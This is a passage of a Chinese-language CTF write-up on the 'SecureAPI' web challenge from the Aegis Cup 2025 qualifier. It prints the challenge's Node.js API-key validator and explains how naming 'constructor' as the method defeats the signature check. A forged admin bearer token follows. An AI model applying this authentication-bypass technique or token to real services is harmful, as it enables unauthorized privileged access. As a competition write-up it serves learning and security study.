class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> validators = &#123;</span><br><span class="line">	<span class="attr">hmac256</span>: <span class="function">(<span class="params">data, secret</span>) =&gt;</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> crypto.<span class="title function_">createHmac</span>(<span class="string">&#x27;sha256&#x27;</span>, secret).<span class="title function_">update</span>(data).<span class="title function_">digest</span>(<span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line">	&#125;,</span><br><span class="line">	<span class="attr">hmac512</span>: <span class="function">(<span class="params">data, secret</span>) =&gt;</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> crypto.<span class="title function_">createHmac</span>(<span class="string">&#x27;sha512&#x27;</span>, secret).<span class="title function_">update</span>(data).<span class="title function_">digest</span>(<span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line">	&#125;,</span><br><span class="line">	<span class="attr">sha256</span>: <span class="function">(<span class="params">data, secret</span>) =&gt;</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> crypto.<span class="title function_">createHash</span>(<span class="string">&#x27;sha256&#x27;</span>).<span class="title function_">update</span>(data + secret).<span class="title function_">digest</span>(<span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">encodePayload</span> = (<span class="params">obj</span>) =&gt; &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="title class_">Buffer</span>.<span class="title function_">from</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(obj)).<span class="title function_">toString</span>(<span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">decodePayload</span> = (<span class="params">base64Str</span>) =&gt; &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="title class_">Buffer</span>.<span class="title function_">from</span>(base64Str, <span class="string">&#x27;base64&#x27;</span>).<span class="title function_">toString</span>());</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">generateApiKey</span> = (<span class="params">method, payload, secret</span>) =&gt; &#123;</span><br><span class="line">	<span class="keyword">const</span> version = <span class="string">&#x27;v1&#x27;</span>;</span><br><span class="line">	<span class="keyword">const</span> encodedPayload = <span class="title function_">encodePayload</span>(payload);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">const</span> validator = validators[method.<span class="title function_">toLowerCase</span>()];</span><br><span class="line">	<span class="keyword">if</span> (!validator) &#123;</span><br><span class="line">		<span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">`Unsupported validation method: <span class="subst">$&#123;method&#125;</span>`</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">const</span> signature = <span class="title function_">validator</span>(encodedPayload, secret);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="string">`SAPI-<span class="subst">$&#123;version&#125;</span>-<span class="subst">$&#123;method&#125;</span>-<span class="subst">$&#123;encodedPayload&#125;</span>-<span class="subst">$&#123;signature&#125;</span>`</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">validateApiKey</span> = (<span class="params">apiKey, secret</span>) =&gt; &#123;</span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		<span class="keyword">const</span> parts = apiKey.<span class="title function_">split</span>(<span class="string">&#x27;-&#x27;</span>);</span><br><span class="line">		<span class="keyword">if</span> (parts.<span class="property">length</span> !== <span class="number">5</span> || parts[<span class="number">0</span>] !== <span class="string">&#x27;SAPI&#x27;</span>) &#123;</span><br><span class="line">			<span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;Invalid credential format&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">const</span> [prefix, version, method, encodedPayload, expectedSignature] = parts;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (version !== <span class="string">&#x27;v1&#x27;</span>) &#123;</span><br><span class="line">			<span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;Unsupported credential version&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">const</span> validator = validators[method.<span class="title function_">toLowerCase</span>()];</span><br><span class="line">		<span class="keyword">if</span> (!validator) &#123;</span><br><span class="line">			<span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;Unsupported authentication method&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">const</span> calculatedSignature = <span class="title function_">validator</span>(encodedPayload, secret);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">const</span> encodedCalculated = <span class="built_in">encodeURIComponent</span>(calculatedSignature);</span><br><span class="line">		<span class="keyword">const</span> encodedExpected = <span class="built_in">encodeURIComponent</span>(expectedSignature);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (encodedCalculated !== encodedExpected) &#123;</span><br><span class="line">			<span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;Authentication verification failed&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">const</span> payload = <span class="title function_">decodePayload</span>(encodedPayload);</span><br><span class="line">		<span class="keyword">return</span> payload;</span><br><span class="line"></span><br><span class="line">	&#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">		<span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;Credential validation failed&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">	generateApiKey,</span><br><span class="line">	validateApiKey,</span><br><span class="line">	encodePayload,</span><br><span class="line">	decodePayload</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>簡言之它指定了 validators 是一個 map 起來的鍵值對應函數的 call，validateApiKey 函數會把使用者輸入的特定格式 API Key<br><code>SAPI-$&#123;version&#125;-$&#123;method&#125;-$&#123;encodedPayload&#125;-$&#123;signature&#125;</code><br>split 起來後拿輸入的 method 在 validators lower 後當 index 取值並當作函數呼叫，最後比對 signature 和 encodedPayload 用剛剛取出的函數簽名後的結果做比對。  </p>
+<p>然而，這裡是 javascript，常打 web 的朋友應該都知道像是 prototype pollution 攻擊會利用到的 JS Magic Methods（在 js 底下所有物件都有 <code>__proto__</code> 指向它的母物件，然後 <code>constructor</code> 是建構子函數）<br>注意到 constructor，實驗一下就會發現 <code>constructor(&quot;input1&quot;, &quot;input2&quot;, ...)</code> 回傳的字串內容都是 “input1”，因為他嘗試對第一個輸入建立一個函數<br>所以最後的 Exploit 做法就是，version 指定 1，method 讓它去取 constructor，data 和 signature 塞同一個東西就能過了。<br>最後就是根據這題寫一下 data （某種 json encoded 內容）  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Authorization: Bearer SAPI-v1-constructor-eyJyb2xlIjogImFkbWluIiwgImFwaSI6ICJhZG1pbi9mbGFnIiwgInRpbWVzdGFtcCI6IDE3NTg5NTQwMjU4NjIsICJ1c2VyIjogIndoYWxlMTIwIn0=-eyJyb2xlIjogImFkbWluIiwgImFwaSI6ICJhZG1pbi9mbGFnIiwgInRpbWVzdGFtcCI6IDE3NTg5NTQwMjU4NjIsICJ1c2VyIjogIndoYWxlMTIwIn0=</span><br></pre></td></tr></table></figure>
+<p>幫大家 decode  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;role&quot;: &quot;admin&quot;, &quot;api&quot;: &quot;admin/flag&quot;, &quot;timestamp&quot;: 1758954025862, &quot;user&quot;: &quot;whale120&quot;&#125;                                                         </span><br></pre></td></tr></table></figure>
+
+
+<p><img src="https://hackmd.io/_uploads/H19IBjB3lg.png" alt="image">  </p>
+<h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>我該睡了掰掰 XD  </p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-all"><span class="toc-number">1.</span> <span class="toc-text">Before all</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto"><span class="toc-number">2.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Secret-In-Frame-revenge"><span class="toc-number">2.1.</span> <span class="toc-text">Secret In Frame revenge</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">3.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Amnesia-Dose"><span class="toc-number">3.1.</span> <span class="toc-text">Amnesia Dose</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SecureAPI"><span class="toc-number">3.2.</span> <span class="toc-text">SecureAPI</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#After-all"><span class="toc-number">4.</span> <span class="toc-text">After all</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2025/09/28/aegis-2025/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2025/09/28/aegis-2025/&text=神盾盃 2025 Qual Writeup - by Whale120"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2025/09/28/aegis-2025/&title=神盾盃 2025 Qual Writeup - by Whale120"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2025/09/28/aegis-2025/&is_video=false&description=神盾盃 2025 Qual Writeup - by Whale120"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=神盾盃 2025 Qual Writeup - by Whale120&body=Check out this article: http://wha13.github.io/2025/09/28/aegis-2025/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2025/09/28/aegis-2025/&title=神盾盃 2025 Qual Writeup - by Whale120"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2025/09/28/aegis-2025/&title=神盾盃 2025 Qual Writeup - by Whale120"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2025/09/28/aegis-2025/&title=神盾盃 2025 Qual Writeup - by Whale120"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2025/09/28/aegis-2025/&title=神盾盃 2025 Qual Writeup - by Whale120"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2025/09/28/aegis-2025/&name=神盾盃 2025 Qual Writeup - by Whale120&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2025/09/28/aegis-2025/&t=神盾盃 2025 Qual Writeup - by Whale120"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023-2025
+    William Lin
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
